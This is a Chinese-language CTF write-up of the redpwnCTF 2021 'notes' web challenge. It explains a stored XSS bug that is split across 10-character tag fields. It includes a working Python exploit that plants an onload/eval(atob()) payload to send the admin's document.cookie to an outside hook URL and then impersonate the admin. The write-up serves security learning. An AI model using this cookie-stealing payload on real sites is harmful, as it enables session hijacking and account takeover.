# [CTF] XSS 系列 
XSS 相關應用
(日後會持續更新)
# redpwnCTF 2021 / notes

## :memo: 題目
https://ctftime.org/task/16469
![](https://i.imgur.com/T4rg9ug.png)

### url : https://notes.mc.ax/
![](https://i.imgur.com/du8uuEY.png)
![](https://i.imgur.com/yX34WT1.png)
![](https://i.imgur.com/CM1gsyj.png)

### admin : https://admin-bot.mc.ax/notes
![](https://i.imgur.com/JrwBMrz.png)

### :rocket: **目標與理解**

* 具有存儲筆記的功能的網站
* 利用參數中存儲的 XSS 漏洞
* 有效載荷被限制為 10 個字元
* 有一個管理員網站，有權查看所有筆記
* 不能創建admin管理員帳號
* 發送一個具有 XSS 的有效負載鏈接給管理員，觸發存儲的 XSS 並獲取他的 cookie
* *管理員還將FLAG存儲為他的私人筆記(之後才得知)*
* 我們以管理員身份登錄(利用cookie偽造身分)並獲得FLAG

(可以把管理員機器人想成一位人員正在用改筆記並且其帳號為admin，目標就是獲取admin帳號的cookie偽造管理員查看admin帳號筆記內容)
### :bulb: **漏洞利用**
* **由於可以存儲許多筆記，因此使用多個筆記製作有效的 XSS 負載**

## Solution

觀察所提供的網站source code，發現有趣部分：
(小技巧：有時有問題處，原始碼都會有註解或相關說明，可由此思考問題)

> notes\public\static\view\index.js
```javascript=
const template = document.querySelector('#note-template').innerHTML;
const container = document.querySelector('.container');
const user = new URL(window.location).pathname.split('/')[2];

const populateTemplate = (template, params) =>
  template.replace(/\{\{\s?(.+?)\s?\}\}/g, (match, param) => params[param]);

(async () => {
  const request = await fetch(`/api/notes/${user}`);
  const notes = await request.json();

  const renderedNotes = [];
  for (const note of notes) {
    // this one is controlled by user, so prevent xss
    const body = note.body
      .replaceAll('<', '&lt;')
      .replaceAll('>', '&gt;')
      .replaceAll('"', '&quot;')
      .replaceAll('\'', '&#39;');
    // this one isn't, but make sure it fits on page
    const tag =
      note.tag.length > 10 ? note.tag.substring(0, 7) + '...' : note.tag;
    // render templates and put them in our array
    const rendered = populateTemplate(template, { body, tag });
    renderedNotes.push(rendered);
  }

  container.innerHTML += renderedNotes.join('');
})();
```
上述程式所代表意思為將用戶所撰寫的筆記渲染到 HTML 模板中。但為了防範 XSS ，設計將可能導致 XSS 的特殊字符編碼排處在body參數中。


下圖為https://notes.mc.ax/view/[username]時 HTML 模板
![](https://i.imgur.com/cukP1yq.png)

![](https://i.imgur.com/URndctz.png)


觀察網站操作時，期間的request與動作。可利用"F12檢查"功能來查看。
![](https://i.imgur.com/zg2loP5.png)

發現https://notes.mc.ax/home/中填寫筆記欄位與tag資訊選擇，對應notes\public\static\view\index.js中的body與tag參數
![](https://i.imgur.com/yX34WT1.png)

因此要可針對body與tag參數進行 XSS 攻擊。

:::success
在查看網站時，可能認為tag只能是public或private，但可以使用像 Burp 這樣的 HTTP 代理修改為任何內容，或者使用python撰寫request程式。
所以我們有一個控制的參數(tag參數)，它沒有被過濾並可直接添加到 HTML 中存儲 XSS(因為筆記被存儲在後端程式中)。
:::

但注意到tag參數的長度只能為 10 個字元。

### **觸發 XSS**
看完 writeup 後發現可以拆分 XSS 負載並將每個部分存儲在==單獨註釋==的標籤中，在剛剛的 HTML 模板形成一個有效的 XSS 負載。

目標先嘗試以下 XSS 有效負載
```javascript=
<script>alert(1)</script>
```

拆分成兩次請求內容，並該網站符合規則

請求 1：
```javascript=
data = {
    "body": "anything",
    "tag": "<script>/*"
}
```

請求 2：
```javascript=
data = {
    "body": "*/alert(1)/*",
    "tag": "*/"
}
```

最後請求後，能在https://notes.mc.ax/view/[username]頁面結果發現如下圖結果
![](https://i.imgur.com/qCx1Q0h.png)
成功注入 XSS!!

### 不專業POC說明
接著利用上述做法，來且寫入 XSS 片段。

:Warning: 注意：
1. 利用具有可執行js程式碼片段的 HTML 屬性標籤。例如：有 onload 屬性的標籤
![https://www.w3schools.com/jsref/event_onload.asp](https://i.imgur.com/ny5o3EW.png)
2. 善用js中eval()函數執行程式 
https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/eval
3. 了解 HTML 解析方式，當 HTML tag 中有錯誤的語法或函式並不影響 HTML 解析，瀏覽器會將可解析物件全部解析完成後，顯示最終結果(才會有時寫出的網頁跑版，但還是能顯示)。錯誤程式片段將會略過或於 F12檢查 中顯示error訊息。
因此下圖 onload 中利用模板符號 \` (可跨行特性)區分的片段是無效程式碼(此處不能用/* */因為會變為註解，為了使onload=""內皆為可執行片段(非註解)，因此使用js中特有的可跨行的模板符號(也不能使用 " " 或 ''' ''' 跨行，js沒有->待確定))，並忽略該區段(紅圈處)，接著利用分號 ; 接下一個函式eval()。
*(onload中是用onload="func1();func2()"，利用 "" 與 ; 區分不同函式)*
![](https://i.imgur.com/MrMbwmv.png)
4. eval內式利用base64編碼，先在exploit程式中將欲執行的js程式片段(fetch請求並撈cookie)進行base64編碼，再利用js中atob()函式編碼後的值轉換為原始js程式，如此可避免(繞過)後端index.js中的非法符號與字元的過濾。
https://developer.mozilla.org/en-US/docs/Web/API/atob
![](https://i.imgur.com/B89OPRP.png)
5. 因為要獲取cookie因此可以利用js中fetch()函式並搭配document.cookie使hook的請求ur參數帶出管理員的cookie資訊。
![](https://i.imgur.com/DFj05Bc.png)
hook url使用工具： <!--hook url名稱待確定-->
    1. **hookbin** https://hookbin.com/
    ![](https://i.imgur.com/UweZ1vu.png)
    ![](https://i.imgur.com/fysDFtm.png)
    2.**pipedream** https://pipedream.com/
    ![](https://i.imgur.com/cd6FzR8.png)
    3.**ngrok** https://ngrok.com/
    ![](https://i.imgur.com/IlLMl1N.png)

總結來說，就是盡可能湊出目標獲取cookie的有效 XSS 片段。(方法很多)

最後，觀察原始碼，發現管理者是可以獲取任何tag的筆記，不論是 public 或 private 或我們自訂的，如下第4行。(所以我們改tag是沒關係的)
> notes\modules\api-plugin.js
```javascript=
fastify.get('/notes/:username', (req) => {
  const notes = db.getNotes(req.params.username);
  if (req.params.username === req.auth.username) return notes;
  if (req.auth.username === 'admin') return notes; // if admin return all the notes
  return notes.filter((note) => note.tag === 'public');
});
```
因此，將帶有XSS的筆記內容產生的url輸入至管理員機器人(提供觸發 XSS 的url)，讓管理員查看我們的筆記。當管理員機器人訪問url時，XSS 就會向我們的 hook 提供管理員的 cookie。

> exploit.py <!--改排版-->
```python=
#!/usr/bin/env python3
import requests
import base64

url = "https://notes.mc.ax"
hookurl = "https://enuij82n12eplyz.m.pipedream.net"
# hookurl = "https://hookb.in/1glQXg3EMpfd6NOO6ByD"  # replace with your hookbin url
code = "fetch('{}?key='+document.cookie)".format(hookurl)
encoded = base64.b64encode(code.encode()).decode()
# 可參考http://www.tastones.com/zh-tw/stackoverflow/python-language/the-base64-module/encoding_and_decoding_base64/

username = "miku"  # replace with random username

with requests.Session() as s:
    s.headers.update({'Content-Type': 'application/json'})
    data = {
        "username": username,
        "password": username
    }
    res = s.post(url+'/api/register', json=data)
    print("[+] Registered a user..")

    # first part
    data = {
        "body": "anything",
        "tag": "<style a='"
    }
    res = s.post(url+'/api/notes', json=data)

    # second part
    data = {
        "body": "anything",
        "tag": "'onload='`"
    }
    res = s.post(url+'/api/notes', json=data)

    # third part
    data = {
        "body": "`;eval(atob(`{}`))/*".format(encoded),
        "tag": "*/'>"
    }
    res = s.post(url+'/api/notes', json=data)

print("Visit {}/view/{} to trigger stored XSS".format(url, username))
print("Payload generated. Visit {} for cookie".format(hookurl)) 
```

* 當自己訪問自己的筆記時，獲取自己的cookie
![](https://i.imgur.com/z8RClID.png)
![](https://i.imgur.com/epS9vxh.png)


* 當被管理員訪問時，就可在 hook url 獲取管理員的cookie資訊
![](https://i.imgur.com/9rcS2yQ.png)
![](https://i.imgur.com/s3eZtiL.png)

最後，利用"F12檢查"工具更改cookie資訊(改為管理員cookie)，獲取(偽造)管理員筆記本狀態。
![](https://i.imgur.com/AAICPjo.png)

並且將 url 的 username 改為 admin
> https://notes.mc.ax/view/admin
![](https://i.imgur.com/zO521fP.png)

就可以獲取 admin 帳號筆記本內的Flag了~
![](https://i.imgur.com/HcmjVUS.png)

若更改 cookie ，但進入 https://notes.mc.ax/view/admin 是無法的，因為沒有 cookie 資訊

Finish!!
![](https://i.imgur.com/0VpTfnM.png)

## :triangular_flag_on_post: Flag
> flag{w0w_4n07h3r_60lf1n6_ch4ll3n63}
> 
<!-- ### 相關文章
* https://jokrhub.github.io/2021/06/13/redpwnCTF-2021-notes.html
* https://github.com/Ryn0K/CTF_Writeups/tree/master/redpwn/web/notes/notes
* https://www.wikiwand.com/zh-tw/%E7%BB%9F%E4%B8%80%E8%B5%84%E6%BA%90%E5%AE%9A%E4%BD%8D%E7%AC%A6
 -->
:::info

:pushpin: **TODO**
- [ ] None
:::

**:pencil2: 2021/09/10 Sheng**

---
